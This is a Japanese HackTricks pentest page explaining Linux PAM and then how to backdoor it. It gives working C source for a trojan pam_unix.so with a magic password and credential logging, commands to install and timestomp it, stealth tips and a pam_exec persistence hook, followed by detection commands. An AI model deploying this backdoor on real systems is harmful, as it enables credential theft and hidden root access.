# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### 基本情報

**PAM (Pluggable Authentication Modules)** はセキュリティ機構として機能し、**コンピュータサービスへのアクセスを試みるユーザーの身元を検証します**。さまざまな基準に基づいてアクセスを制御します。これはデジタルな門番のようなもので、認可されたユーザーのみが特定のサービスに関与できるようにし、システム過負荷を防ぐために使用を制限することもあります。

#### 設定ファイル

- **Solaris や UNIX ベースのシステム** は通常、中央の設定ファイル `/etc/pam.conf` を使用します。
- **Linux システム** はディレクトリ方式を好み、サービスごとの設定を `/etc/pam.d` に格納します。例えば、login サービスの設定ファイルは `/etc/pam.d/login` にあります。

login サービスの PAM 設定例は次のようになります:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM 管理領域**

これらの領域（管理グループ）には **auth**, **account**, **password**, **session** が含まれ、それぞれ認証およびセッション管理プロセスの異なる側面を担当します：

- **Auth**: ユーザーの身元を検証します。多くの場合、パスワードを要求します。
- **Account**: アカウントの検証を処理します。グループ所属や時間帯制限などの条件を確認します。
- **Password**: パスワードの更新を管理します。複雑性チェックや辞書攻撃の防止などを含みます。
- **Session**: サービスセッションの開始や終了時の処理を管理します。ディレクトリのマウントやリソース制限の設定など。

#### **PAM モジュールの制御**

制御はモジュールの成功・失敗時の挙動を決定し、全体の認証プロセスに影響します。主なものは次のとおりです：

- **Required**: 必須モジュールが失敗すると最終的に失敗になりますが、後続のモジュールもすべてチェックした後で判断されます。
- **Requisite**: 失敗すると即座に処理を終了します。
- **Sufficient**: 成功すると同一領域内の残りのチェックをスキップします（ただし、後続のモジュールが失敗した場合は例外）。
- **Optional**: スタック内で唯一のモジュールである場合にのみ失敗を引き起こします。

#### 例のシナリオ

複数の auth モジュールがある設定では、処理は厳密な順序で実行されます。`pam_securetty` がログイン端末を許可されていないと判断した場合、root ログインはブロックされますが、そのモジュールが "required" のため、他のモジュールもすべて処理されます。`pam_env` は環境変数を設定し、ユーザー体験を向上させる可能性があります。`pam_ldap` と `pam_unix` は共同でユーザーを認証し、`pam_unix` は事前に提供されたパスワードを使用しようとするため、認証の効率と柔軟性が高まります。


## Backdooring PAM – Hooking `pam_unix.so`

高価値な Linux 環境での古典的な永続化トリックは、正規の PAM ライブラリを trojanised drop-in に差し替えることです。すべての SSH / コンソールログインは `pam_unix.so:pam_sm_authenticate()` を呼ぶため、数行の C で資格情報を取り込んだり、*magic* パスワードバイパスを実装したりすることが可能です。

### Compilation Cheatsheet
<details>
<summary>サンプル `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
</details>

コンパイルしてステルス置換:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### OpSec のヒント
1. **Atomic overwrite** – 一時ファイルに書き込み、`mv`で所定の場所に移動して、SSH をロックアウトするような中途半端に書かれたライブラリを防ぐ。
2. ログファイル配置（例: `/usr/bin/.dbus.log`）は正規のデスクトップアーティファクトに溶け込む。
3. シンボルのエクスポートを同一に保つ（`pam_sm_setcred` 等）ことで PAM の異常動作を避ける。

### 検出
* `pam_unix.so` の MD5/SHA256 をディストロのパッケージと比較する。
* `rpm -V pam` または `debsums -s libpam-modules` を使って手動でハッシュを取らずに置き換えられたライブラリを見つける。
* `/lib/security/` 以下で world-writable（誰でも書き込み可）や異常な所有権がないか確認する。
* `auditd` ルール: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* 予期しないモジュールを PAM 設定から探す: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### クイックトリアージコマンド（侵害後または脅威ハンティング時）
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### `pam_exec` を使った永続化の悪用
`pam_unix.so` を置き換える代わりに、より軽い方法として `/etc/pam.d/sshd` に `pam_exec` 行を追記し、通常のスタックを維持したまますべての SSH ログインで implant を起動させます:
```bash
# Prepend to /etc/pam.d/sshd
session optional pam_exec.so quiet /usr/local/bin/.ssh_hook.sh
```
`pam_exec` は sshd の PAM コンテキスト内で root として実行されるため、スクリプトはファイルシステムやコアライブラリに変更を加えることなく reverse shells を展開したり、env vars を収集したり、implanted sockets を再オープンしたりできます。


## 参考

- [https://hotpotato.tistory.com/434](https://hotpotato.tistory.com/434)
- [Palo Alto Unit42 – Infiltration of Global Telecom Networks](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)

{{#include ../../banners/hacktricks-training.md}}
